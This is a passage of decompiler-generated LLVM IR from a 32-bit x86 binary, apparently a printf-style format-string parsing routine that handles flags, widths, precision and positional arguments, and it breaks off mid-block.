  %v1_8052497 = add i32 %tmp76, 16
  %v2_8052497 = inttoptr i32 %v1_8052497 to i32*
  %v3_8052497 = load i32, i32* %v2_8052497, align 4
  %v1_805249a = and i32 %v3_8052497, 128
  %v2_805249a = icmp eq i32 %v1_805249a, 0
  store i32 %v1_805249a, i32* %edi.global-to-local, align 4
  %v1_80524a0 = icmp eq i1 %v2_805249a, false
  br i1 %v1_80524a0, label %dec_label_pc_80524b3, label %dec_label_pc_80524a2

dec_label_pc_80524a2:                             ; preds = %entry
  %v2_80524a2 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8052500.outer

dec_label_pc_80524ad:                             ; preds = %dec_label_pc_805263b
  %v1_80524ad = add i32 %v0_805263b.pre.pre, 1
  store i32 %v1_80524ad, i32* @esi, align 4
  br label %dec_label_pc_805264b

dec_label_pc_80524b3:                             ; preds = %entry
  %v15_8052465 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80524b5

dec_label_pc_80524b5:                             ; preds = %dec_label_pc_80524dd.dec_label_pc_80524b5_crit_edge, %dec_label_pc_80524b3
  %v2_80524c6 = phi i32 [ %v2_80524c6.pre, %dec_label_pc_80524dd.dec_label_pc_80524b5_crit_edge ], [ %v15_8052465, %dec_label_pc_80524b3 ]
  %v3_80524c6 = phi i32 [ %v1_80524dd, %dec_label_pc_80524dd.dec_label_pc_80524b5_crit_edge ], [ 0, %dec_label_pc_80524b3 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_80524b9 = mul i32 %v3_80524c6, 4
  store i32 %v1_80524b9, i32* @ecx, align 4
  %v2_80524c0 = load i32, i32* %arg1, align 4
  store i32 %v2_80524c0, i32* @edx, align 4
  %v2_80524c2 = add i32 %v1_80524b9, -4
  %v3_80524c2 = add i32 %v2_80524c2, %v2_80524c0
  %v4_80524c2 = inttoptr i32 %v3_80524c2 to i32*
  %v5_80524c2 = load i32, i32* %v4_80524c2, align 4
  store i32 %v5_80524c2, i32* %eax.global-to-local, align 4
  %v1_80524c6 = trunc i32 %v5_80524c2 to i8
  %v4_80524c6 = add i32 %v2_80524c6, 36
  %v5_80524c6 = add i32 %v4_80524c6, %v3_80524c6
  %v6_80524c6 = inttoptr i32 %v5_80524c6 to i8*
  store i8 %v1_80524c6, i8* %v6_80524c6, align 1
  %v0_80524ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80524ca = urem i32 %v0_80524ca, 256
  %v2_80524ca = load i32, i32* @ebx, align 4
  %v3_80524ca = and i32 %v2_80524ca, -256
  %v4_80524ca = or i32 %v3_80524ca, %v1_80524ca
  store i32 %v4_80524ca, i32* @ebx, align 4
  %v1_80524cc = mul i32 %v0_80524ca, 16777216
  %v2_80524cc = sdiv i32 %v1_80524cc, 16777216
  store i32 %v2_80524cc, i32* %eax.global-to-local, align 4
  %v1_80524cf = load i32, i32* @edx, align 4
  %v2_80524cf = load i32, i32* @ecx, align 4
  %v3_80524cf = add i32 %v1_80524cf, -4
  %v4_80524cf = add i32 %v3_80524cf, %v2_80524cf
  %v5_80524cf = inttoptr i32 %v4_80524cf to i32*
  %v6_80524cf = load i32, i32* %v5_80524cf, align 4
  %v17_80524cf = icmp eq i32 %v2_80524cc, %v6_80524cf
  %v1_80524d3 = icmp eq i1 %v17_80524cf, false
  br i1 %v1_80524d3, label %dec_label_pc_8052825, label %dec_label_pc_80524d9

dec_label_pc_80524d9:                             ; preds = %dec_label_pc_80524b5
  %v3_80524d9 = trunc i32 %v0_80524ca to i8
  %v4_80524d9 = icmp eq i8 %v3_80524d9, 0
  br i1 %v4_80524d9, label %dec_label_pc_80524e3, label %dec_label_pc_80524dd

dec_label_pc_80524dd:                             ; preds = %dec_label_pc_80524d9
  %v0_80524dd = load i32, i32* %esi.global-to-local, align 4
  %v1_80524dd = add i32 %v0_80524dd, 1
  store i32 %v1_80524dd, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80524dd, 32
  br i1 %tmp, label %dec_label_pc_80524dd.dec_label_pc_80524b5_crit_edge, label %dec_label_pc_80524e3

dec_label_pc_80524dd.dec_label_pc_80524b5_crit_edge: ; preds = %dec_label_pc_80524dd
  %v2_80524c6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80524b5

dec_label_pc_80524e3:                             ; preds = %dec_label_pc_80524dd, %dec_label_pc_80524d9
  %v2_80524e8 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_8052500.outer

dec_label_pc_8052500.outer:                       ; preds = %dec_label_pc_80524e3, %dec_label_pc_80524a2, %dec_label_pc_805261d
  %v0_805250c.ph94 = phi i32 [ %v1_805261d, %dec_label_pc_805261d ], [ %v2_80524a2, %dec_label_pc_80524a2 ], [ %v2_80524e8, %dec_label_pc_80524e3 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_805261d ], [ %tmp66, %dec_label_pc_80524a2 ], [ %tmp66, %dec_label_pc_80524e3 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_80524a6, %dec_label_pc_805261d ], [ 0, %dec_label_pc_80524a2 ], [ 0, %dec_label_pc_80524e3 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_805261d ], [ %v3_8052490, %dec_label_pc_80524a2 ], [ %v3_8052490, %dec_label_pc_80524e3 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_805261d ], [ 0, %dec_label_pc_80524a2 ], [ 0, %dec_label_pc_80524e3 ]
  %v7_8052507 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_8052507 = trunc i64 %v7_8052507 to i32
  %v2_805250f = add i32 %v8_8052507, 80
  br label %dec_label_pc_8052500

dec_label_pc_8052500:                             ; preds = %dec_label_pc_8052500.outer, %dec_label_pc_80525bd
  %v0_805250c = phi i32 [ %v0_80525ca, %dec_label_pc_80525bd ], [ %v0_805250c.ph94, %dec_label_pc_8052500.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_80525bd ], [ %stack_var_-32.1.ph, %dec_label_pc_8052500.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_80525bd ], [ %stack_var_-88.1.ph, %dec_label_pc_8052500.outer ]
  store i32 %v0_805250c, i32* @edx, align 4
  %v1_8052500 = inttoptr i32 %v0_805250c to i8*
  %v2_8052500 = load i8, i8* %v1_8052500, align 1
  %v11_8052500 = icmp eq i8 %v2_8052500, 42
  store i32 %v0_805250c, i32* @esi, align 4
  %v1_8052505 = icmp eq i1 %v11_8052500, false
  br i1 %v1_8052505, label %dec_label_pc_8052517, label %dec_label_pc_8052507

dec_label_pc_8052507:                             ; preds = %dec_label_pc_8052500
  store i32 %v8_8052507, i32* %eax.global-to-local, align 4
  %v1_805250c = add i32 %v0_805250c, 1
  store i32 %v1_805250c, i32* @esi, align 4
  %v0_805250f = load i32, i32* @esp, align 4
  %v3_805250f = add i32 %v2_805250f, %v0_805250f
  %v4_805250f = inttoptr i32 %v3_805250f to i32*
  store i32 0, i32* %v4_805250f, align 4
  %v0_8052531.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052517

dec_label_pc_8052517:                             ; preds = %dec_label_pc_8052500, %dec_label_pc_8052507
  %v0_8052531.pre = phi i32 [ %v0_805250c, %dec_label_pc_8052500 ], [ %v0_8052531.pre.pre, %dec_label_pc_8052507 ]
  %v0_8052517 = load i32, i32* @global_var_805c278, align 8
  store i32 %v0_8052517, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8052531.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052531

dec_label_pc_8052521:                             ; preds = %dec_label_pc_8052531
  %v1_8052521 = add i32 %v1_8052529, -4094
  %v6_8052521 = sub i32 4093, %v1_8052529
  %v7_8052521 = and i32 %v6_8052521, %v1_8052529
  %v8_8052521 = icmp slt i32 %v7_8052521, 0
  %v9_8052521 = icmp eq i32 %v1_8052521, 0
  %v10_8052521 = icmp slt i32 %v1_8052521, 0
  %v3_8052527 = icmp eq i1 %v10_8052521, %v8_8052521
  %v4_8052527 = icmp eq i1 %v9_8052521, false
  %v5_8052527 = and i1 %v4_8052527, %v3_8052527
  br i1 %v5_8052527, label %dec_label_pc_8052530, label %dec_label_pc_8052529

dec_label_pc_8052529:                             ; preds = %dec_label_pc_8052521
  %v3_8052529 = mul i32 %v1_8052529, 10
  store i32 %v3_8052529, i32* %eax.global-to-local, align 4
  %v2_805252c = add i32 %v3_8052529, -48
  %v3_805252c = add i32 %v2_805252c, %v2_8052533
  store i32 %v3_805252c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052530

dec_label_pc_8052530:                             ; preds = %dec_label_pc_8052521, %dec_label_pc_8052529
  %v0_805254b32 = phi i32 [ %v1_8052529, %dec_label_pc_8052521 ], [ %v3_805252c, %dec_label_pc_8052529 ]
  %v4_805253128 = phi i32 [ %v6_8052531, %dec_label_pc_8052521 ], [ %v3_8052529, %dec_label_pc_8052529 ]
  %v1_8052530 = add i32 %v0_8052530, 1
  store i32 %v1_8052530, i32* @esi, align 4
  br label %dec_label_pc_8052531

dec_label_pc_8052531:                             ; preds = %dec_label_pc_8052517, %dec_label_pc_8052530
  %v1_8052529 = phi i32 [ 0, %dec_label_pc_8052517 ], [ %v0_805254b32, %dec_label_pc_8052530 ]
  %v4_8052531 = phi i32 [ %v4_8052531.pre, %dec_label_pc_8052517 ], [ %v4_805253128, %dec_label_pc_8052530 ]
  %v0_8052530 = phi i32 [ %v0_8052531.pre, %dec_label_pc_8052517 ], [ %v1_8052530, %dec_label_pc_8052530 ]
  %v1_8052531 = inttoptr i32 %v0_8052530 to i8*
  %v2_8052531 = load i8, i8* %v1_8052531, align 1
  %v3_8052531 = zext i8 %v2_8052531 to i32
  %v5_8052531 = and i32 %v4_8052531, -256
  %v6_8052531 = or i32 %v3_8052531, %v5_8052531
  store i32 %v6_8052531, i32* %eax.global-to-local, align 4
  %v2_8052533 = sext i8 %v2_8052531 to i32
  store i32 %v2_8052533, i32* @ecx, align 4
  %v2_8052536 = mul nsw i32 %v2_8052533, 2
  %v3_8052536 = add i32 %v2_8052536, %v0_8052517
  %v4_8052536 = inttoptr i32 %v3_8052536 to i8*
  %v5_8052536 = load i8, i8* %v4_8052536, align 1
  %v6_8052536 = and i8 %v5_8052536, 8
  %v7_8052536 = icmp eq i8 %v6_8052536, 0
  %v1_805253b = icmp eq i1 %v7_8052536, false
  br i1 %v1_805253b, label %dec_label_pc_8052521, label %dec_label_pc_805253d

dec_label_pc_805253d:                             ; preds = %dec_label_pc_8052531
  %v0_805253d = load i32, i32* @edx, align 4
  %v1_805253d = add i32 %v0_805253d, -1
  %v2_805253d = inttoptr i32 %v1_805253d to i8*
  %v3_805253d = load i8, i8* %v2_805253d, align 1
  %v12_805253d = icmp eq i8 %v3_805253d, 37
  %v1_8052541 = icmp eq i1 %v12_805253d, false
  br i1 %v1_8052541, label %dec_label_pc_80525d4, label %dec_label_pc_8052547

dec_label_pc_8052547:                             ; preds = %dec_label_pc_805253d
  %v10_8052547 = icmp eq i8 %v2_8052531, 36
  %v1_8052549 = icmp eq i1 %v10_8052547, false
  br i1 %v1_8052549, label %dec_label_pc_805257b, label %dec_label_pc_805254b

dec_label_pc_805254b:                             ; preds = %dec_label_pc_8052547
  %tmp89 = icmp slt i32 %v1_8052529, 1
  br i1 %tmp89, label %dec_label_pc_805257b, label %dec_label_pc_805254f

dec_label_pc_805254f:                             ; preds = %dec_label_pc_805254b
  %v4_805254f = icmp eq i32 %stack_var_-88.1, 0
  %v1_8052554 = add i32 %v0_8052530, 1
  store i32 %v1_8052554, i32* @edx, align 4
  br i1 %v4_805254f, label %dec_label_pc_8052825, label %dec_label_pc_805255d

dec_label_pc_805255d:                             ; preds = %dec_label_pc_805254f
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_8052565 = sub i32 %v1_8052529, %stack_var_-88.1
  %v8_8052565 = xor i32 %v1_8052529, %stack_var_-88.1
  %v9_8052565 = xor i32 %v2_8052565, %v1_8052529
  %v10_8052565 = and i32 %v9_8052565, %v8_8052565
  %v11_8052565 = icmp slt i32 %v10_8052565, 0
  %v12_8052565 = icmp eq i32 %v2_8052565, 0
  %v13_8052565 = icmp slt i32 %v2_8052565, 0
  %v3_8052567 = icmp ne i1 %v13_8052565, %v11_8052565
  %v4_8052567 = or i1 %v12_8052565, %v3_8052567
  %stack_var_-88.1.v0_8052569 = select i1 %v4_8052567, i32 %stack_var_-88.1, i32 %v1_8052529
  br label %dec_label_pc_8052577

dec_label_pc_8052577:                             ; preds = %dec_label_pc_805258b, %dec_label_pc_805255d, %dec_label_pc_805258f
  %v0_8052577 = phi i32 [ %v1_8052554, %dec_label_pc_805255d ], [ %v0_805253d, %dec_label_pc_805258f ], [ %v0_805253d, %dec_label_pc_805258b ]
  %stack_var_-32.2 = phi i32 [ %v1_8052529, %dec_label_pc_805255d ], [ %stack_var_-32.1, %dec_label_pc_805258f ], [ %stack_var_-32.1, %dec_label_pc_805258b ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_8052569, %dec_label_pc_805255d ], [ 0, %dec_label_pc_805258f ], [ 0, %dec_label_pc_805258b ]
  store i32 %v0_8052577, i32* @esi, align 4
  br label %dec_label_pc_805259e

dec_label_pc_805257b:                             ; preds = %dec_label_pc_805254b, %dec_label_pc_8052547
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_805258b, label %dec_label_pc_8052582

dec_label_pc_8052582:                             ; preds = %dec_label_pc_805257b
  %v10_8052582 = icmp eq i8 %v2_8052531, 109
  br i1 %v10_8052582, label %dec_label_pc_80525d4, label %dec_label_pc_8052825

dec_label_pc_805258b:                             ; preds = %dec_label_pc_805257b
  %tmp153 = icmp ugt i32 %v0_8052530, %v0_805253d
  br i1 %tmp153, label %dec_label_pc_805258f, label %dec_label_pc_8052577

dec_label_pc_805258f:                             ; preds = %dec_label_pc_805258b
  %v1_805258f = inttoptr i32 %v0_805253d to i8*
  %v2_805258f = load i8, i8* %v1_805258f, align 1
  %v8_805258f = icmp eq i8 %v2_805258f, 48
  br i1 %v8_805258f, label %dec_label_pc_8052577, label %dec_label_pc_80525d4

dec_label_pc_805259e:                             ; preds = %dec_label_pc_80525af, %dec_label_pc_8052577
  %v0_80525ca = phi i32 [ %v1_80525af, %dec_label_pc_80525af ], [ %v0_8052577, %dec_label_pc_8052577 ]
  %v4_80525a835 = phi i32 [ %v6_80525a8, %dec_label_pc_80525af ], [ %v6_8052531, %dec_label_pc_8052577 ]
  store i32 ptrtoint ([8 x i8]* @global_var_805a2aa.484 to i32), i32* %edx.global-to-local, align 4
  %v1_80525ab = inttoptr i32 %v0_80525ca to i8*
  br label %dec_label_pc_80525a8

dec_label_pc_80525a8:                             ; preds = %dec_label_pc_80525b9, %dec_label_pc_805259e
  %v4_80525a8 = phi i32 [ %v4_80525a835, %dec_label_pc_805259e ], [ %v6_80525a8, %dec_label_pc_80525b9 ]
  %v0_80525aa = phi i32 [ ptrtoint ([8 x i8]* @global_var_805a2aa.484 to i32), %dec_label_pc_805259e ], [ %v1_80525aa, %dec_label_pc_80525b9 ]
  %v0_80525b9 = phi i32 [ 1, %dec_label_pc_805259e ], [ %v2_80525b9, %dec_label_pc_80525b9 ]
  store i32 %v0_80525b9, i32* @ecx, align 4
  %v1_80525a8 = inttoptr i32 %v0_80525aa to i8*
  %v2_80525a8 = load i8, i8* %v1_80525a8, align 1
  %v3_80525a8 = zext i8 %v2_80525a8 to i32
  %v5_80525a8 = and i32 %v4_80525a8, -256
  %v6_80525a8 = or i32 %v3_80525a8, %v5_80525a8
  store i32 %v6_80525a8, i32* %eax.global-to-local, align 4
  %v1_80525aa = add i32 %v0_80525aa, 1
  store i32 %v1_80525aa, i32* @edx, align 4
  %v2_80525ab = load i8, i8* %v1_80525ab, align 1
  %v15_80525ab = icmp eq i8 %v2_80525ab, %v2_80525a8
  %v1_80525ad = icmp eq i1 %v15_80525ab, false
  br i1 %v1_80525ad, label %dec_label_pc_80525b4, label %dec_label_pc_80525af

dec_label_pc_80525af:                             ; preds = %dec_label_pc_80525a8
  %v1_80525af = add i32 %v0_80525ca, 1
  store i32 %v1_80525af, i32* @esi, align 4
  %v0_80525b0 = load i32, i32* %edi.global-to-local, align 4
  %v2_80525b0 = or i32 %v0_80525b0, %v0_80525b9
  store i32 %v2_80525b0, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805259e

dec_label_pc_80525b4:                             ; preds = %dec_label_pc_80525a8
  %v1_80525b4 = inttoptr i32 %v1_80525aa to i8*
  %v2_80525b4 = load i8, i8* %v1_80525b4, align 1
  %v3_80525b4 = icmp eq i8 %v2_80525b4, 0
  br i1 %v3_80525b4, label %dec_label_pc_80525bd, label %dec_label_pc_80525b9

dec_label_pc_80525b9:                             ; preds = %dec_label_pc_80525b4
  %v2_80525b9 = mul i32 %v0_80525b9, 2
  br label %dec_label_pc_80525a8

dec_label_pc_80525bd:                             ; preds = %dec_label_pc_80525b4
  %v0_80525bd = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80525c1 = udiv i32 %v0_80525bd, 2
  %v1_80525c1.not = or i32 %v1_80525c1, -6
  %v1_80525c6 = xor i32 %v1_80525c1.not, 5
  store i32 %v1_80525c6, i32* %eax.global-to-local, align 4
  %v2_80525c8 = and i32 %v1_80525c6, %v0_80525bd
  store i32 %v2_80525c8, i32* %edi.global-to-local, align 4
  %v1_80525ca = add i32 %v0_80525ca, -1
  %v2_80525ca = inttoptr i32 %v1_80525ca to i8*
  %v3_80525ca = load i8, i8* %v2_80525ca, align 1
  %v12_80525ca = icmp eq i8 %v3_80525ca, 37
  %v1_80525ce = icmp eq i1 %v12_80525ca, false
  br i1 %v1_80525ce, label %dec_label_pc_8052500, label %dec_label_pc_80525d4

dec_label_pc_80525d4:                             ; preds = %dec_label_pc_805258f, %dec_label_pc_80525bd, %dec_label_pc_805253d, %dec_label_pc_8052582
  %v0_80525f7 = phi i32 [ %v1_8052529, %dec_label_pc_8052582 ], [ %v1_8052529, %dec_label_pc_805258f ], [ 0, %dec_label_pc_80525bd ], [ %v1_8052529, %dec_label_pc_805253d ]
  %v1_8052600 = phi i32 [ %v0_8052530, %dec_label_pc_8052582 ], [ %v0_8052530, %dec_label_pc_805258f ], [ %v0_80525ca, %dec_label_pc_80525bd ], [ %v0_8052530, %dec_label_pc_805253d ]
  %v0_80525fd = phi i32 [ %v0_805253d, %dec_label_pc_8052582 ], [ %v0_805253d, %dec_label_pc_805258f ], [ %v1_80525aa, %dec_label_pc_80525bd ], [ %v0_805253d, %dec_label_pc_805253d ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_8052582 ], [ %stack_var_-32.1, %dec_label_pc_805258f ], [ %stack_var_-32.2, %dec_label_pc_80525bd ], [ %stack_var_-32.1, %dec_label_pc_805253d ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_8052582 ], [ 0, %dec_label_pc_805258f ], [ %stack_var_-88.2, %dec_label_pc_80525bd ], [ %stack_var_-88.1, %dec_label_pc_805253d ]
  %v1_80525d4 = inttoptr i32 %v0_80525fd to i8*
  %v2_80525d4 = load i8, i8* %v1_80525d4, align 1
  %v11_80525d4 = icmp eq i8 %v2_80525d4, 42
  %v1_80525d7 = icmp eq i1 %v11_80525d4, false
  br i1 %v1_80525d7, label %dec_label_pc_805260d, label %dec_label_pc_80525d9

dec_label_pc_80525d9:                             ; preds = %dec_label_pc_80525d4
  %v4_80525d9 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_80525d9, label %dec_label_pc_80525fd, label %dec_label_pc_80525e0

dec_label_pc_80525e0:                             ; preds = %dec_label_pc_80525d9
  %v1_80525e0 = inttoptr i32 %v1_8052600 to i8*
  %v2_80525e0 = load i8, i8* %v1_80525e0, align 1
  %v11_80525e0 = icmp eq i8 %v2_80525e0, 36
  %v1_80525e3 = icmp eq i1 %v11_80525e0, false
  br i1 %v1_80525e3, label %dec_label_pc_8052825, label %dec_label_pc_80525e9

dec_label_pc_80525e9:                             ; preds = %dec_label_pc_80525e0
  %tmp91 = icmp slt i32 %v0_80525f7, 1
  br i1 %tmp91, label %dec_label_pc_8052825, label %dec_label_pc_80525f1

dec_label_pc_80525f1:                             ; preds = %dec_label_pc_80525e9
  store i32 %v8_8052507, i32* %eax.global-to-local, align 4
  %v1_80525f6 = add i32 %v1_8052600, 1
  store i32 %v1_80525f6, i32* @esi, align 4
  %v1_80525f7 = load i32, i32* @esp, align 4
  %v3_80525f7 = add i32 %v8_8052507, 68
  %v4_80525f7 = add i32 %v3_80525f7, %v1_80525f7
  %v5_80525f7 = inttoptr i32 %v4_80525f7 to i32*
  store i32 %v0_80525f7, i32* %v5_80525f7, align 4
  %v0_805263b.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052608

dec_label_pc_80525fd:                             ; preds = %dec_label_pc_80525d9
  %v1_80525fd = add i32 %v0_80525fd, 1
  store i32 %v1_80525fd, i32* %eax.global-to-local, align 4
  %v12_8052600 = icmp eq i32 %v1_80525fd, %v1_8052600
  %v1_8052602 = icmp eq i1 %v12_8052600, false
  br i1 %v1_8052602, label %dec_label_pc_8052825, label %dec_label_pc_8052608

dec_label_pc_8052608:                             ; preds = %dec_label_pc_80525fd, %dec_label_pc_80525f1
  %v0_805263b.pre.pre.pre = phi i32 [ %v1_8052600, %dec_label_pc_80525fd ], [ %v0_805263b.pre.pre.pre.pre, %dec_label_pc_80525f1 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805260d

dec_label_pc_805260d:                             ; preds = %dec_label_pc_80525d4, %dec_label_pc_8052608
  %v0_805263b.pre.pre = phi i32 [ %v1_8052600, %dec_label_pc_80525d4 ], [ %v0_805263b.pre.pre.pre, %dec_label_pc_8052608 ]
  %v0_80524a6 = phi i32 [ %v0_80525f7, %dec_label_pc_80525d4 ], [ -2147483648, %dec_label_pc_8052608 ]
  %v4_805260d = trunc i64 %stack_var_-92.1.ph to i32
  %v5_805260d = icmp eq i32 %v4_805260d, 0
  %v1_8052612 = icmp eq i1 %v5_805260d, false
  %.pre = inttoptr i32 %v0_805263b.pre.pre to i8*
  br i1 %v1_8052612, label %dec_label_pc_8052636, label %dec_label_pc_8052618

dec_label_pc_8052618:                             ; preds = %dec_label_pc_805260d
  %v2_8052618 = load i8, i8* %.pre, align 1
  %v11_8052618 = icmp eq i8 %v2_8052618, 46
  %v1_805261b = icmp eq i1 %v11_8052618, false
  br i1 %v1_805261b, label %dec_label_pc_805262f, label %dec_label_pc_805261d

dec_label_pc_805261d:                             ; preds = %dec_label_pc_8052618
  %v1_805261d = add i32 %v0_805263b.pre.pre, 1
  store i32 %v1_805261d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052500.outer

dec_label_pc_805262f:                             ; preds = %dec_label_pc_8052618
  br label %dec_label_pc_8052636

dec_label_pc_8052636:                             ; preds = %dec_label_pc_805260d, %dec_label_pc_805262f
  %stack_var_-96.2 = phi i32 [ %v0_80524a6, %dec_label_pc_805262f ], [ %stack_var_-96.1.ph, %dec_label_pc_805260d ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_805262f ], [ %v0_80524a6, %dec_label_pc_805260d ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_805a258.485 to i32), i32* @edx, align 4
  %v4_805263b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805263b

dec_label_pc_805263b:                             ; preds = %dec_label_pc_8052645, %dec_label_pc_8052636
  %v0_8052645 = phi i32 [ %v1_8052645, %dec_label_pc_8052645 ], [ ptrtoint ([9 x i8]* @global_var_805a258.485 to i32), %dec_label_pc_8052636 ]
  %v4_805263b = phi i32 [ %v6_805263b, %dec_label_pc_8052645 ], [ %v4_805263b.pre, %dec_label_pc_8052636 ]
  %v2_805263b = load i8, i8* %.pre, align 1
  %v3_805263b = zext i8 %v2_805263b to i32
  %v5_805263b = and i32 %v4_805263b, -256
  %v6_805263b = or i32 %v3_805263b, %v5_805263b
  store i32 %v6_805263b, i32* %eax.global-to-local, align 4
  %v3_805263d = inttoptr i32 %v0_8052645 to i8*
  %v4_805263d = load i8, i8* %v3_805263d, align 1
  %v15_805263d = icmp eq i8 %v2_805263b, %v4_805263d
  br i1 %v15_805263d, label %dec_label_pc_80524ad, label %dec_label_pc_8052645

dec_label_pc_8052645:                             ; preds = %dec_label_pc_805263b
  %v1_8052645 = add i32 %v0_8052645, 1
  store i32 %v1_8052645, i32* @edx, align 4
  %v1_8052646 = inttoptr i32 %v1_8052645 to i8*
  %v2_8052646 = load i8, i8* %v1_8052646, align 1
  %v3_8052646 = icmp eq i8 %v2_8052646, 0
  %v1_8052649 = icmp eq i1 %v3_8052646, false
  br i1 %v1_8052649, label %dec_label_pc_805263b, label %dec_label_pc_805264b

dec_label_pc_805264b:                             ; preds = %dec_label_pc_8052645, %dec_label_pc_80524ad
  %v0_805265e = phi i32 [ %v1_80524ad, %dec_label_pc_80524ad ], [ %v0_805263b.pre.pre, %dec_label_pc_8052645 ]
  %v0_805265b = phi i32 [ %v0_8052645, %dec_label_pc_80524ad ], [ %v1_8052645, %dec_label_pc_8052645 ]
  %v1_805264d = add i32 %v0_805265b, -134586968
  %v1_8052652 = add i32 %v0_805265b, -134586969
  %v5_8052652 = sub i32 134586968, %v0_805265b
  %v6_8052652 = and i32 %v1_805264d, %v5_8052652
  %v7_8052652 = icmp slt i32 %v6_8052652, 0
  %v8_8052652 = icmp eq i32 %v1_8052652, 0
  %v9_8052652 = icmp slt i32 %v1_8052652, 0
  store i32 %v1_8052652, i32* %eax.global-to-local, align 4
  %v3_8052653 = icmp eq i1 %v9_8052652, %v7_8052652
  %v4_8052653 = icmp eq i1 %v8_8052652, false
  %v5_8052653 = and i1 %v4_8052653, %v3_8052653
  br i1 %v5_8052653, label %dec_label_pc_805265f, label %dec_label_pc_8052655

dec_label_pc_8052655:                             ; preds = %dec_label_pc_805264b
  %v1_8052655 = inttoptr i32 %v0_805265e to i8*
  %v2_8052655 = load i8, i8* %v1_8052655, align 1
  %v3_8052655 = zext i8 %v2_8052655 to i32
  %v5_8052655 = and i32 %v1_8052652, -256
  %v6_8052655 = or i32 %v3_8052655, %v5_8052655
  store i32 %v6_8052655, i32* %eax.global-to-local, align 4
  %v3_8052657 = inttoptr i32 %v0_805265b to i8*
  %v4_8052657 = load i8, i8* %v3_8052657, align 1
  %v15_8052657 = icmp eq i8 %v2_8052655, %v4_8052657
  %v1_8052659 = icmp eq i1 %v15_8052657, false
  br i1 %v1_8052659, label %dec_label_pc_805265f, label %dec_label_pc_805265b

dec_label_pc_805265b:                             ; preds = %dec_label_pc_8052655
  %v1_805265b = add i32 %v0_805265b, 9
  store i32 %v1_805265b, i32* @edx, align 4
  %v1_805265e = add i32 %v0_805265e, 1
  store i32 %v1_805265e, i32* @esi, align 4
  br label %dec_label_pc_805265f

dec_label_pc_805265f:                             ; preds = %dec_label_pc_8052655, %dec_label_pc_805264b, %dec_label_pc_805265b
  %v4_8052663 = phi i32 [ %v6_8052655, %dec_label_pc_8052655 ], [ %v1_8052652, %dec_label_pc_805264b ], [ %v6_8052655, %dec_label_pc_805265b ]
  %v0_8052663 = phi i32 [ %v0_805265e, %dec_label_pc_8052655 ], [ %v0_805265e, %dec_label_pc_805264b ], [ %v1_805265e, %dec_label_pc_805265b ]
  %v0_805265f = phi i32 [ %v0_805265b, %dec_label_pc_8052655 ], [ %v0_805265b, %dec_label_pc_805264b ], [ %v1_805265b, %dec_label_pc_805265b ]
  %v1_805265f = add i32 %v0_805265f, 9
  %v2_805265f = inttoptr i32 %v1_805265f to i8*
  %v3_805265f = load i8, i8* %v2_805265f, align 1
  %v4_805265f = sext i8 %v3_805265f to i32
  store i32 %v4_805265f, i32* %ebx.global-to-local, align 4
  %v1_8052663 = inttoptr i32 %v0_8052663 to i8*
  %v2_8052663 = load i8, i8* %v1_8052663, align 1
  %v3_8052663 = zext i8 %v2_8052663 to i32
  %v5_8052663 = and i32 %v4_8052663, -256
  %v6_8052663 = or i32 %v3_8052663, %v5_8052663
  store i32 %v6_8052663, i32* %eax.global-to-local, align 4
  %v2_8052665 = mul nsw i32 %v4_805265f, 256
  store i32 %v2_8052665, i32* %ebx.global-to-local, align 4
  %v4_8052668 = icmp eq i8 %v2_8052663, 0
  br i1 %v4_8052668, label %dec_label_pc_8052825, label %dec_label_pc_8052670

dec_label_pc_8052670:                             ; preds = %dec_label_pc_805265f
  %v3_8052670 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052670, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_805a295.486 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052679

dec_label_pc_8052679:                             ; preds = %dec_label_pc_80526c9, %dec_label_pc_8052670
  %v0_80526c9 = phi i32 [ %v1_80526c9, %dec_label_pc_80526c9 ], [ ptrtoint ([21 x i8]* @global_var_805a295.486 to i32), %dec_label_pc_8052670 ]
  %v3_8052679 = inttoptr i32 %v0_80526c9 to i8*
  %v4_8052679 = load i8, i8* %v3_8052679, align 1
  %v15_8052679 = icmp eq i8 %v2_8052663, %v4_8052679
  %v1_805267b = icmp eq i1 %v15_8052679, false
